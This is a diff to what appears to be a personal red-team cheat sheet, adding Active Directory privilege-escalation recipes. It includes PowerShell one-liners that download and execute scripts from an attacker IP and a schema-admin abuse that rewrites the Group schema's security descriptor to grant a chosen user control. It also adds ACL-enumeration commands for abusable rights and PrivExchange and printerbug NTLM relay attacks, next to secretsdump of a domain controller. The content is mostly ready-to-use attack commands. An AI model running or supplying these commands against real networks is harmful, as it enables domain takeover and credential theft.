@@ -108,6 +108,44 @@ convertfrom-sid SID
 # wait ~10min, secretsdump the DC
 proxychains -q -f server.conf impacket-secretsdump DOMAIN/USERNAME:'PASSWORD'@dc.domain.local
 ```
+ad abuse schema admin [sauce](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#schema-admins) (IMPORTANT: use msad.dll to Set-ADObject properly) [msad.dll](https://github.com/samratashok/ADModule)
+```
+# make sure you're in Schema Admin context - either RDP in or use powershell -Credential $cred
+iex(new-object net.webclient).downloadstring('http://10.10.14.34/ad.txt')
+iex(new-object net.webclient).downloadstring('http://10.10.14.34/view.txt')
+$username = 'DOMAIN.local\username'
+$password = 'P@ssw0rd' | ConvertTo-SecureString -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
+```
+```
+# get SID of user you wanna elevate
+get-netuser USERTOELEVATE | select objectsid,samaccountname
+```
+```
+# change schema - this allows USERTOELEVATE to edit GROUPS
+upload msad.dll
+import-module c:\windows\tasks\msad.dll
+Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=DOMAIN,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SID_OF_USERTOELEVATE)';} -Verbose -Credential $cred -server dc.DOMAIN.local
+```
+```
+# check if schema got changed - we want to see if our USERTOELEVATE's SID really got added to GROUP objects
+# https://devblogs.microsoft.com/scripting/powershell-and-the-active-directory-schema-part-1/
+
+$schemapath = (Get-ADRootDSE).SchemaNamingContext
+$schemapath
+Get-ADObject -SearchBase $schemapath -Properties * | where Name -like "group"
+
+# MUST SEE THIS:
+VERBOSE: Performing the operation "Set" on target "CN=Group,CN=Schema,CN=Configuration,DC=DOMAIN,DC=local".
+```
+```
+# check for new groups
+get-domaingroup | select samaccountname, whencreated | sort-object whencreated
+```
+```
+# once new group got created, add USERTOELEVATE to the new group
+Add-ADGroupMember NEW_GROUP -Members USERTOELEVATE -Server dc.DOMAIN.local
+```
 abuse force change password
 ```
 $username = 'adminWebSvc'
@@ -866,6 +904,22 @@ powerview get user memberof
 ```
 get-netuser | select name,samaccountname,objectsid,memberof
 ```
+powerview genericwrite
+```
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object {($_.ActiveDirectoryRights -match "GenericWrite")} | Select AceType,ObjectDN,ObjectSID,ActiveDirectoryRights,Identity}
+```
+powerview genericall
+```
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object {($_.ActiveDirectoryRights -match "GenericAll")} | Select AceType,ObjectDN,ObjectSID,ActiveDirectoryRights,Identity}
+```
+powerview writedacl
+```
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object {($_.ActiveDirectoryRights -match "WriteDACL")} | Select AceType,ObjectDN,ObjectSID,ActiveDirectoryRights,Identity}
+```
+powerview forcechangepassword
+```
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ | where-object {($_.ActiveDirectoryRights -match "ForceChangePassword")} | Select AceType,ObjectDN,ObjectSID,ActiveDirectoryRights,Identity}
+```
 printspoofer
 ```
 python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b PipePipe
@@ -890,6 +944,22 @@ c:\windows\tasks\ss.exe db02 db02/pipe/test
 ```
 ^Z
 channel -i 1
+```
+privexchange [sauce](https://github.com/dirkjanm/PrivExchange) (+ ntlmrelayx)
+```
+proxychains -q -f server.conf impacket-ntlmrelayx -t ldap://dc.DOMAIN.local --escalate-user EXCHANGEUSER
+```
+```
+cd /opt/PrivExchange
+proxychains -q -f server.conf python3 ./privexchange.py -ah 10.10.14.34 -d DOMAIN.local -u guest -p "" exchange.cubano.local
+```
+printerbug [sauce](https://github.com/dirkjanm/krbrelayx) (+ ntlmrelayx)
+```
+proxychains -q -f server.conf impacket-ntlmrelayx -t dev.DOMAIN.local
+```
+```
+cd /opt/krbrelayx
+proxychains -q -f server.conf python3 ./printerbug.py DOMAIN/guest@exchange.DOMAIN.local 10.10.14.34
 ```
 psexec.exe
 ```
